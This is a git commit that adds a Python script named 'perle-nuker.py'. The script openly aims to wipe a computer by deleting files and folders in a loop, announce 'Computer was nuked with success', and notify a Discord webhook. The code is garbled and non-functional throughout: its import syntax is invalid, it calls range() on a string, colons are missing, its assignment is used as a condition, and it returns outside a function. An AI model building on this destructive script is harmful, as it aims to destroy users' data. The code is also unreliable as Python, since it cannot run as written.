60d8cb5b03a46080e16e3201b0c14fc9fa1b6c43
natrix_dev <discordlenko@gmail.com>
2022-10-21 22:23:53 +0200

    Create perle-nuker.py

---
+++ Nuker/perle-nuker.py
@@ -0,0 +1,27 @@
+import modules from "./module.pyw" as * 
+import os
+
+data = (f"""
+    ascii_letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    ascii_lowercase = 'abcdefghijklmnopqrstuvwxyz'
+    ascii_uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    digits = '0123456789'
+    hexdigits = '0123456789abcdefABCDEF'
+    octdigits = '01234567'
+    printable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c'
+    punctuation = '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
+    whitespace = ' \t\n\r\x0b\x0c'
+""")
+
+
+while True: 
+  for _ in range(data):
+    if os.path.exists("data+1/5")
+      os.remove(data --file) 
+      os.rmdir(data --folder)
+else:
+  print("Computer was nuked with success ! ")
+  if logs = True:
+    discord.send(webhook)
+    else :
+      return;
